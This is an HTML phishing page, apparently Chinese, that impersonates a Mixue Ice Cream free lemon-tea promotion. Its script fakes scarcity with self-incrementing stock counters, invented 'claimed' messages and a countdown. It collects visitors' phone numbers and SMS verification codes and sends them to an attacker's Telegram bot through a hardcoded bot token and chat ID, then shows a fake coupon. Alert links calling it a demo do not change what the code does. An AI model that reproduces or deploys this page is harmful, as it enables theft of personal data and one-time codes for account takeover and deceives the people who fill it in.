<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>èœœé›ªå†°åŸ Â· é™æ—¶ç¦åˆ© Â· å…è´¹é¢†å†°æ·‡æ·‹/æŸ æª¬èŒ¶</title>
  <style>
    :root {
      --mixue-red: #E63946;
      --mixue-yellow: #FFD166;
      --mixue-white: #F8F9FA;
      --mixue-dark: #252422;
      --mixue-gray: #CCC5B9;
      --shadow-light: 0 8px 32px rgba(230, 57, 70, 0.25);
      --radius-lg: 28px;
      --radius-md: 18px;
      --radius-sm: 12px;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
      background: url('https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000045799-imagetourl.cloud-1769923010594-scb6om.png') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 15px;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: linear-gradient(180deg, rgba(230,57,70,0.08), rgba(255,209,102,0.05));
      z-index: -1;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.98);
      border-radius: var(--radius-lg);
      overflow: hidden;
      box-shadow: var(--shadow-light);
      border: 1px solid rgba(230,57,70,0.1);
      animation: fadeUp 0.6s ease-out;
    }
    @keyframes fadeUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .header {
      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
      color: var(--mixue-white);
      padding: 42px 28px 24px;
      text-align: center;
      position: relative;
    }
    .header::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 6px;
      background: var(--mixue-yellow);
    }
    .header h1 {
      font-size: 2.6rem;
      font-weight: 900;
      letter-spacing: 2px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .header p {
      margin: 10px 0 16px;
      font-size: 1.15rem;
      font-weight: 500;
      opacity: 0.95;
    }

    .activity-period {
      font-size: 0.9rem;
      background: rgba(255,255,255,0.15);
      padding: 10px 20px;
      border-radius: 50px;
      display: inline-block;
      margin: 8px 0 16px;
    }
    #globalTimer {
      color: var(--mixue-yellow);
      font-weight: 700;
    }
    .stock-info {
      font-size: 1rem;
      background: rgba(0,0,0,0.2);
      padding: 10px 20px;
      border-radius: 50px;
      margin: 12px auto;
      max-width: 90%;
      font-weight: 600;
    }
    .low-stock {
      color: var(--mixue-yellow) !important;
      animation: blinkWarn 1s infinite alternate;
    }
    @keyframes blinkWarn {
      from { opacity: 1; }
      to { opacity: 0.7; }
    }

    .join-count {
      text-align: center;
      font-size: 1.2rem;
      color: var(--mixue-red);
      background: rgba(255,209,102,0.15);
      padding: 12px;
      margin: 0;
      font-weight: 700;
      animation: pulse 2.5s infinite;
    }
    @keyframes pulse {
      0%,100% { transform: scale(1); }
      50% { transform: scale(1.03); }
    }

    .content {
      padding: 32px 28px 40px;
      background: var(--mixue-white);
    }

    .input-box {
      position: relative;
      margin-bottom: 20px;
      z-index: 1;
    }
    
    input {
      width: 100%;
      height: 56px;
      padding: 0 24px;
      border: 2px solid var(--mixue-gray);
      border-radius: var(--radius-md);
      font-size: 1rem;
      background: #fff;
      transition: all 0.3s ease;
      position: relative;
      z-index: 2;
      -webkit-appearance: none;
      appearance: none;
      opacity: 1;
      /* ä¿®å¤è¾“å…¥æ¡†ç¦ç”¨æ€å¯ç‚¹å‡» */
      pointer-events: auto;
    }
    
    input::placeholder {
      color: #aaa;
    }
    
    input:focus {
      outline: none;
      border-color: var(--mixue-red);
      box-shadow: 0 0 0 6px rgba(230,57,70,0.1);
      transform: translateY(-2px);
    }
    
    input.input-error {
      border-color: #ff4d4f;
      box-shadow: 0 0 0 6px rgba(255,77,79,0.1);
      animation: shake 0.3s ease-in-out;
    }
    
    @keyframes shake {
      0%,100% { transform: translateX(0); }
      25% { transform: translateX(-4px); }
      75% { transform: translateX(4px); }
    }
    
    .placeholder {
      position: absolute;
      left: 24px;
      top: 50%;
      transform: translateY(-50%);
      color: #888;
      font-size: 1rem;
      pointer-events: none;
      transition: all 0.3s ease;
      background: #fff;
      padding: 0 6px;
      z-index: 3;
      white-space: nowrap;
    }
    
    input:focus + .placeholder,
    input:not(:placeholder-shown) + .placeholder {
      top: -10px;
      left: 20px;
      font-size: 0.8rem;
      color: var(--mixue-red);
      font-weight: 600;
    }

    .barrage-box {
      height: 80px;
      margin: 0 0 20px;
      background: rgba(230,57,70,0.05);
      border-radius: var(--radius-sm);
      overflow: hidden;
      position: relative;
      border: 1px solid rgba(230,57,70,0.1);
    }
    
    .barrage-item {
      position: absolute;
      white-space: nowrap;
      font-size: 0.9rem;
      font-weight: 600;
      color: var(--mixue-red);
      padding: 6px 16px;
      line-height: 20px;
      left: 100%;
      background: rgba(255,255,255,0.9);
      border-radius: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      animation: barrageSlide 8s linear forwards;
      z-index: 1;
    }
    
    @keyframes barrageSlide {
      0% { left: 100%; }
      100% { left: -100%; }
    }

    /* é‡å†™æ»‘å—UIï¼Œä¼˜åŒ–ç¾è§‚åº¦ */
    .verify-slider {
      width: 100%;
      height: 46px;
      background: #f7f8fa;
      border-radius: 23px;
      position: relative;
      margin: 20px 0;
      overflow: hidden;
      border: 1px solid #e5e6eb;
      display: none;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.4s ease;
    }
    .verify-slider.show {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }
    .verify-bg {
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      background: linear-gradient(90deg, var(--mixue-yellow), #ffbd59);
      width: 0;
      transition: width 0.2s ease;
      border-radius: 23px 0 0 23px;
    }
    .verify-block {
      position: absolute;
      left: 0;
      top: 0;
      width: 46px;
      height: 46px;
      background: linear-gradient(135deg, var(--mixue-red), #d62e3d);
      border-radius: 50%;
      cursor: grab;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 20px;
      font-weight: bold;
      transition: left 0.2s ease, transform 0.2s ease;
      z-index: 2;
      user-select: none;
      -webkit-user-select: none;
      box-shadow: 0 2px 8px rgba(230,57,70,0.3);
    }
    .verify-block:active {
      cursor: grabbing;
      transform: scale(1.1);
    }
    .verify-text {
      position: absolute;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #666;
      font-size: 0.95rem;
      font-weight: 500;
      z-index: 1;
      user-select: none;
    }
    .verify-success .verify-bg {
      background: linear-gradient(90deg, #52c41a, #73d13d);
      border-radius: 23px;
    }
    .verify-success .verify-block {
      background: linear-gradient(135deg, #52c41a, #73d13d);
      box-shadow: 0 2px 8px rgba(82, 196, 26, 0.3);
    }

    .fair-tip {
      text-align: center;
      font-size: 0.85rem;
      color: var(--mixue-red);
      margin: 12px 0;
      font-weight: 600;
      line-height: 1.4;
    }

    .btn {
      width: 100%;
      height: 60px;
      background: linear-gradient(135deg, var(--mixue-red), #D62E3D);
      color: #fff;
      border: none;
      border-radius: var(--radius-md);
      font-size: 1.25rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: 16px;
      position: relative;
      overflow: hidden;
      box-shadow: 0 6px 16px rgba(230,57,70,0.3);
      z-index: 1;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(230,57,70,0.4);
    }
    .btn:disabled {
      background: var(--mixue-gray);
      cursor: not-allowed;
      box-shadow: none;
      transform: none;
    }
    .btn:active {
      transform: scale(0.97);
    }
    .btn::after {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      background: rgba(255,255,255,0.3);
      border-radius: 50%;
      transform: translate(-50%,-50%);
      transition: width 0.6s, height 0.6s;
    }
    .btn:active::after {
      width: 500px;
      height: 500px;
    }

    #countdown {
      opacity: 0;
      color: var(--mixue-red);
      text-align: center;
      margin-top: 14px;
      font-size: 0.95rem;
      font-weight: 500;
    }

    .agreement {
      margin-top: 28px;
      font-size: 0.85rem;
      color: #666;
      text-align: center;
      line-height: 1.5;
    }
    .agreement a {
      color: var(--mixue-red);
      font-weight: 600;
      text-decoration: none;
    }

    .modal {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.7);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      animation: fadeIn 0.3s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .modal-content {
      background: linear-gradient(135deg, var(--mixue-red), #FF6B6B);
      color: #fff;
      border-radius: var(--radius-lg);
      padding: 48px 32px;
      text-align: center;
      max-width: 380px;
      width: 95%;
      box-shadow: 0 20px 60px rgba(230,57,70,0.4);
      animation: popScale 0.5s cubic-bezier(0.175,0.885,0.32,1.2);
    }
    @keyframes popScale {
      0% { transform: scale(0.6); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .modal h2 {
      font-size: 2.8rem;
      margin: 0 0 20px;
      font-weight: 900;
      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .modal .coupon-code {
      font-size: 2rem;
      font-weight: bold;
      background: rgba(255,255,255,0.25);
      padding: 18px;
      border-radius: var(--radius-sm);
      margin: 28px 0;
      letter-spacing: 3px;
      border: 2px dashed #fff;
    }
    .modal-emoji {
      font-size: 5rem;
      margin: 32px 0;
    }
    .modal-btn {
      margin-top: 36px;
      background: #fff;
      color: var(--mixue-red);
      border: none;
      padding: 18px 60px;
      border-radius: var(--radius-md);
      font-size: 1.25rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
    }
    .modal-btn:active {
      transform: scale(0.96);
    }
  </style>
</head>
<body>

<div class="card">
  <div class="header">
    <h1>èœœé›ªå†°åŸ</h1>
    <p>æ˜¥èŠ‚ç‹‚æ¬¢ Â· å…è´¹é¢†å¤§æ¯æŸ æª¬èŒ¶</p>
    <div class="activity-period">
      æ´»åŠ¨è¿›è¡Œä¸­ï¼š2026å¹´1æœˆ30æ—¥ â€” 2026å¹´2æœˆ18æ—¥<br>
      <strong id="globalTimer">æœ¬è½®åé¢å€’è®¡æ—¶ï¼šè®¡ç®—ä¸­...</strong>
    </div>
    <div class="stock-info">å…¨å›½é™é‡5000ä»½ï¼Œå·²é¢† <span id="claimedCount">4567</span> å¼ ï¼Œä»…å‰© <span id="remainCount">433</span> å¼ </div>
  </div>

  <div class="join-count">å·²æœ‰ <span id="countNum">4,567</span> äººæŠ¢åˆ°ç¦åˆ©</div>

  <div class="content">
    <div class="barrage-box" id="barrageBox"></div>

    <div class="fair-tip">ä¸ºäº†æ´»åŠ¨å…¬å¹³ï¼Œç¦æ­¢ä½¿ç”¨å¤–æŒ‚æ“ä½œï¼Œè¿è§„å°†å–æ¶ˆé¢†å–èµ„æ ¼</div>

    <div class="input-box">
      <input type="text" id="nickname" placeholder="ä½ çš„æ˜µç§°ï¼ˆé€‰å¡«ï¼Œå±•ç¤ºç”¨ï¼‰" maxlength="20" autocomplete="off" />
    </div>

    <div class="input-box">
      <input type="tel" id="phone" placeholder="è¯·è¾“å…¥æ‰‹æœºå·" maxlength="11" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
    </div>

    <div class="verify-slider" id="verifySlider">
      <div class="verify-bg" id="verifyBg"></div>
      <div class="verify-block" id="verifyBlock">â†’</div>
      <div class="verify-text">æ»‘åŠ¨å®ŒæˆéªŒè¯</div>
    </div>

    <div class="input-box">
      <input type="text" id="code" placeholder="è¯·è¾“å…¥éªŒè¯ç " maxlength="6" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
    </div>

    <button class="btn" id="getCodeBtn" disabled>è·å–éªŒè¯ç </button>
    <button class="btn" id="submitBtn" style="display:none;" disabled>ç«‹å³é¢†å–</button>

    <div class="countdown" id="countdown">éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶ï¼ˆ60sï¼‰</div>

    <div class="agreement">
      ç™»å½•å³ä»£è¡¨åŒæ„ã€Š<a href="javascript:alert('æœ¬æ´»åŠ¨ä¸ºæ¼”ç¤ºç‰ˆæœ¬ï¼Œéå®˜æ–¹æ­£å¼æ´»åŠ¨');">ç”¨æˆ·åè®®</a>ã€‹å’Œã€Š<a href="javascript:alert('ä»…ç”¨äºå­¦ä¹ æ¼”ç¤ºï¼Œä¿¡æ¯ä¸ä¼šç”¨äºå•†ä¸šç”¨é€”');">éšç§æ”¿ç­–</a>ã€‹
    </div>
  </div>
</div>

<div class="modal" id="successModal">
  <div class="modal-content">
    <h2>é¢†å–æˆåŠŸï¼</h2>
    <p>å¤§æ¯æŸ æª¬èŒ¶ä¼˜æƒ åˆ¸å·²å‘é€è‡³æ‚¨çš„æ‰‹æœº</p>
    <div class="coupon-code" id="fakeCode">MXICE202602-ABCD-1234</div>
    <p style="font-size:1.22rem; font-weight:bold; margin:20px 0;">è¯·ç«‹å³åˆ°åº—ä½¿ç”¨ï¼è¿‡æœŸä½œåºŸ</p>
    <div class="modal-emoji">ğŸ‰ğŸ¦ğŸ”¥</div>
    <p style="font-size:1.08rem; opacity:0.9;">é—¨åº—æ ¸é”€æœ‰æ•ˆæœŸè‡³2026å¹´3æœˆ31æ—¥</p>
    <button class="modal-btn" id="closeModalBtn">å¥½çš„ï¼Œå»åº—é‡Œå…‘ï¼</button>
  </div>
</div>

<script>
const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
const CHAT_ID   = '8439448087';

const TOTAL_STOCK = 5000;
let claimed = 4567;
let initialClaimed = claimed;
let isVerifySuccess = false;

let timers = {
  fakeStock: null,
  barrageAuto: null,
  codeCd: null,
  globalCd: null
};

const phoneEl     = document.getElementById('phone');
const nicknameEl  = document.getElementById('nickname');
const codeEl      = document.getElementById('code');
const getBtn      = document.getElementById('getCodeBtn');
const submitBtn   = document.getElementById('submitBtn');
const cdEl        = document.getElementById('countdown');
const modal       = document.getElementById('successModal');
const countNumEl  = document.getElementById('countNum');
const claimedEl   = document.getElementById('claimedCount');
const remainEl    = document.getElementById('remainCount');
const barrageBox  = document.getElementById('barrageBox');
const closeModalBtn = document.getElementById('closeModalBtn');
const verifySlider = document.getElementById('verifySlider');
const verifyBlock = document.getElementById('verifyBlock');
const verifyBg = document.getElementById('verifyBg');

const phonePrefixes = ['130','131','132','133','134','135','136','137','138','139','145','147','150','151','152','153','155','156','157','158','159','170','171','172','173','175','176','177','178','180','181','182','183','184','185','186','187','188','189','190','191','198','199'];
const surnames = ['èµµ','é’±','å­™','æ','å‘¨','å´','éƒ‘','ç‹','å†¯','é™ˆ','è’‹','æ²ˆ','éŸ©','æ¨','æœ±','ç§¦','è®¸','ä½•','å•','æ–½','å¼ ','å­”','æ›¹','ä¸¥','å','é‡‘','é­','é™¶','å§œ','éƒ','è‘£','æ¢','æœ','æˆ´','å®‹','å”','é‚“','è”¡','æ½˜','è¢','äº','èƒ¡','æ—','éƒ­','é©¬','ç½—','é«˜','è°¢','å½­','è‹','å¢','ä¸','è–›','å¶','é˜','ä½™','å¤','é’Ÿ','æ±ª','ç”°','ä»»','èŒƒ','æ–¹','çŸ³','å§š','è°­','å»–','é‚¹','ç†Š','é™†','ç™½','å´”','åº·','æ¯›','é‚±','æ±Ÿ','å²','é¡¾','ä¾¯','é‚µ','å­Ÿ','é¾™','ä¸‡','æ®µ','é›·','æ±¤','å°¹','é»','æ˜“','å¸¸','æ­¦','ä¹”','è´º','èµ–','é¾š'];

function updateStockDisplay() {
  const realClaimed = claimed;
  const realRemain  = Math.max(0, TOTAL_STOCK - (realClaimed - initialClaimed));
  claimedEl.textContent  = realClaimed.toLocaleString();
  remainEl.textContent   = realRemain.toLocaleString();
  countNumEl.textContent = realClaimed.toLocaleString();
  remainEl.classList.toggle('low-stock', realRemain < 100);
}

function fakeClaimIncrease() {
  const add = 1 + Math.floor(Math.random() * 6);
  claimed += add;
  updateStockDisplay();

  for(let i = 0; i < Math.min(add, 3); i++) {
    setTimeout(shootBarrage, i * 1200);
  }
}

function shootBarrage(customPhone = null) {
  let phoneDisplay = customPhone && /^1[3-9]\d{9}$/.test(customPhone)
    ? customPhone.slice(0,3) + "****" + customPhone.slice(-4)
    : phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)] + "****" + (1000 + Math.floor(Math.random() * 9000));

  const surname = surnames[Math.floor(Math.random() * surnames.length)];
  const item = document.createElement('div');
  item.className = 'barrage-item';
  item.textContent = `${surname}* ${phoneDisplay} åˆšåˆšé¢†å–æˆåŠŸï¼`;
  
  const randomTop = 5 + Math.floor(Math.random() * 40);
  item.style.top = randomTop + 'px';
  
  const randomDuration = 8 + Math.random() * 4;
  item.style.animationDuration = randomDuration + 's';

  barrageBox.appendChild(item);
  setTimeout(() => item.remove(), randomDuration * 1000);
}

function checkPhoneValid() {
  const phoneVal = phoneEl.value.trim();
  const phoneValid = /^1[3-9]\d{9}$/.test(phoneVal);
  
  if(phoneVal.length > 0 && !phoneValid) {
    phoneEl.classList.add('input-error');
  } else {
    phoneEl.classList.remove('input-error');
  }

  if(phoneValid) {
    verifySlider.classList.add('show');
    initSliderVerify();
  } else {
    verifySlider.classList.remove('show');
    isVerifySuccess = false;
    resetSlider();
  }
  
  getBtn.disabled = !phoneValid || !isVerifySuccess;
}

function resetSlider() {
  verifySlider.classList.remove('verify-success');
  verifyBlock.style.left = '0px';
  verifyBg.style.width = '0px';
  verifyBlock.textContent = 'â†’';
}

function initSliderVerify() {
  if(verifyBlock.dataset.inited) return;
  verifyBlock.dataset.inited = 'true';

  let isDragging = false;
  const sliderWidth = verifySlider.offsetWidth;
  const blockWidth = verifyBlock.offsetWidth;
  const maxLeft = sliderWidth - blockWidth;

  verifyBlock.addEventListener('mousedown', startDrag);
  verifyBlock.addEventListener('touchstart', (e) => {
    e.preventDefault();
    startDrag(e.touches[0]);
  }, { passive: false });

  function startDrag(e) {
    if (isVerifySuccess) return;
    isDragging = true;
    const startX = e.clientX;
    const startLeft = 0;

    document.addEventListener('mousemove', dragMove);
    document.addEventListener('touchmove', (e) => {
      e.preventDefault();
      dragMove(e.touches[0]);
    }, { passive: false });

    document.addEventListener('mouseup', dragEnd);
    document.addEventListener('touchend', (e) => {
      dragEnd(e.changedTouches[0]);
    });

    function dragMove(e) {
      if (!isDragging) return;
      const moveX = e.clientX - startX;
      let left = Math.max(0, Math.min(startLeft + moveX, maxLeft));
      verifyBlock.style.left = left + 'px';
      verifyBg.style.width = left + 'px';
    }

    function dragEnd(e) {
      if (!isDragging) return;
      isDragging = false;
      const finalLeft = parseInt(verifyBlock.style.left) || 0;
      if (finalLeft >= maxLeft * 0.9) {
        verifySuccess();
      } else {
        resetSlider();
      }
      document.removeEventListener('mousemove', dragMove);
      document.removeEventListener('touchmove', dragMove);
      document.removeEventListener('mouseup', dragEnd);
      document.removeEventListener('touchend', dragEnd);
    }
  }

  function verifySuccess() {
    isVerifySuccess = true;
    verifySlider.classList.add('verify-success');
    verifyBlock.textContent = 'âœ“';
    verifyBlock.style.left = maxLeft + 'px';
    verifyBg.style.width = maxLeft + 'px';
    checkPhoneValid();
  }
}

phoneEl.addEventListener('input', (e) => {
  checkPhoneValid();
});

phoneEl.addEventListener('blur', checkPhoneValid);

getBtn.addEventListener('click', async () => {
  if (getBtn.disabled || !isVerifySuccess) return;
  const phone = phoneEl.value.trim();
  const nickname = nicknameEl.value.trim() || 'æœªå¡«';

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `ã€èœœé›ª-æ‰‹æœºå·ã€‘\næ˜µç§°ï¼š${nickname}\næ‰‹æœºå·ï¼š${phone}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`
      })
    });
  } catch(e) {
    console.error('ä¸ŠæŠ¥å¤±è´¥:', e);
    alert('ç½‘ç»œå¼‚å¸¸ï¼ŒéªŒè¯ç å‘é€å¤±è´¥ï¼Œè¯·é‡è¯•');
    return;
  }

  let sec = 60;
  getBtn.disabled = true;
  codeEl.disabled = false;
  codeEl.focus();
  cdEl.style.opacity = '1';
  cdEl.textContent = `éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶ï¼ˆ${sec}sï¼‰`;

  timers.codeCd = setInterval(() => {
    sec--;
    getBtn.textContent = `é‡æ–°è·å–(${sec}s)`;
    cdEl.textContent = `éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶ï¼ˆ${sec}sï¼‰`;
    if (sec <= 0) {
      clearInterval(timers.codeCd);
      checkPhoneValid();
      getBtn.textContent = 'è·å–éªŒè¯ç ';
      cdEl.style.opacity = '0';
    }
  }, 1000);
});

codeEl.addEventListener('input', (e) => {
  const val = codeEl.value.trim();
  submitBtn.style.display = val.length >= 4 ? 'block' : 'none';
  submitBtn.disabled = val.length < 4;
  if(val.length > 0 && val.length < 4) {
    codeEl.classList.add('input-error');
  } else {
    codeEl.classList.remove('input-error');
  }
});

submitBtn.addEventListener('click', async () => {
  if (submitBtn.disabled || !isVerifySuccess) return;
  const phone = phoneEl.value.trim();
  const code  = codeEl.value.trim();
  const nickname = nicknameEl.value.trim() || 'æœªå¡«';

  if (code.length < 4) {
    codeEl.classList.add('input-error');
    alert('è¯·è¾“å…¥æœ‰æ•ˆçš„éªŒè¯ç ');
    return;
  }

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `ã€èœœé›ª-å®Œæˆã€‘\næ˜µç§°ï¼š${nickname}\næ‰‹æœºå·ï¼š${phone}\néªŒè¯ç ï¼š${code}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`
      })
    });
  } catch(e) {
    console.error('æäº¤ä¸ŠæŠ¥å¤±è´¥:', e);
    alert('ç½‘ç»œå¼‚å¸¸ï¼Œæäº¤å¤±è´¥ï¼Œè¯·é‡è¯•');
    return;
  }

  const key = 'mx_claim_' + phone;
  if (localStorage.getItem(key)) {
    alert('æ‚¨å·²é¢†å–è¿‡ï¼Œè¯·å‹¿é‡å¤æ“ä½œ~');
    return;
  }
  localStorage.setItem(key, Date.now().toString());

  claimed++;
  updateStockDisplay();
  shootBarrage(phone);
  modal.style.display = 'flex';
});

closeModalBtn.addEventListener('click', () => {
  modal.style.display = 'none';
});

modal.addEventListener('click', (e) => {
  if (e.target === modal) modal.style.display = 'none';
});

function startGlobalCountdown() {
  let remain = (120 + Math.floor(Math.random() * 150)) * 60;
  const timerEl = document.getElementById('globalTimer');

  const tick = () => {
    if (remain <= 0) {
      timerEl.textContent = "æœ¬è½®å·²ç»“æŸï¼Œæ­£åœ¨è¿›å…¥ä¸‹ä¸€è½®...";
      setTimeout(() => location.reload(), 2500);
      return;
    }
    const h = Math.floor(remain / 3600).toString().padStart(2, '0');
    const m = Math.floor((remain % 3600) / 60).toString().padStart(2, '0');
    const s = (remain % 60).toString().padStart(2, '0');
    timerEl.textContent = `æœ¬è½®åé¢å€’è®¡æ—¶ï¼š${h}:${m}:${s}`;
    remain--;
  };

  tick();
  timers.globalCd = setInterval(tick, 1000);
}

timers.fakeStock   = setInterval(fakeClaimIncrease, 2200);
timers.barrageAuto = setInterval(shootBarrage, 3800);
startGlobalCountdown();
updateStockDisplay();

window.addEventListener('beforeunload', () => {
  Object.values(timers).forEach(t => clearInterval(t));
});
</script>
</body>
</html>
